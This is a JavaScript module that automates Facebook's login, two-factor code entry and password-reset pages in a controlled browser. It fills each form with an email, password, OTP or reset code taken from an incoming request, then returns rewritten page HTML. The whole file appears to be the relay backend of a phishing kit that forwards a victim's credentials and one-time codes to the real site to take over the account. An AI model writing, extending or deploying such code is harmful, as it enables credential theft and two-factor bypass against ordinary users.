const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Facebook extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]

        try {
            if (spikeType == "login") {
                await page.waitForSelector("#email")
                await page.waitForSelector("#pass")

                let clearInputs = ["#email"]

                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i]); // Focus on the input element

                    // Use keyboard shortcuts to clear the input field
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type('[name="email"]', body.email)
                await page.type('[name="pass"]', body.pass)

                await Promise.all([
                    page.click('[name="login"]'),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "m_login") {
                await page.waitForSelector("#m_login_email")
                await page.waitForSelector("#m_login_password")

                let clearInputs = ["#m_login_email"]

                for (let i = 0; i < clearInputs.length; i++) {
                    await page.focus(clearInputs[i]); // Focus on the input element

                    // Use keyboard shortcuts to clear the input field
                    await page.keyboard.down('Control')
                    await page.keyboard.press('A')
                    await page.keyboard.up('Control')
                    await page.keyboard.press('Backspace')
                }

                await page.type('#m_login_email', body.email)
                await page.type('#m_login_password', body.pass)

                try {
                    await Promise.all([
                        page.click('[name="login"]'),
                        new Promise(re => setTimeout(re, 3000))
                    ])
                } catch (error) { }

            } else if (spikeType == "otp") {
                await page.waitForSelector(`[name="approvals_code"]`)
                await page.type(`[name="approvals_code"]`, body["approvals_code"])

                await Promise.all([
                    page.click('#checkpointSubmitButton'),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "forgetpassword") {
                let submit = "#spike-forget-password"
                await page.evaluate(() => {
                    let allAtags = document.querySelectorAll("a")
                    allAtags.forEach(a => {
                        if (a.innerText == "Forgotten password?") {
                            a.id = "spike-forget-password"
                        }
                    })
                })

                await page.waitForSelector(submit)
                await Promise.all([
                    page.click(submit),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "find_accound") {
                let selectors = "#identify_email"
                await page.waitForSelector(selectors)

                await page.type(selectors, body.email)
                await page.click(`[name="did_submit"]`)
                await Promise.all([
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "reset_action") {
                await page.waitForSelector(`[name="reset_action"]`)

                await Promise.all([
                    page.click('[name="reset_action"]'),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else if (spikeType == "reset_action_otp") {
                await page.waitForSelector(`[name="n"]`)
                await page.type(`[name="n"]`, body.n)

                await Promise.all([
                    page.click('[name="reset_action"]'),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Facebook(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}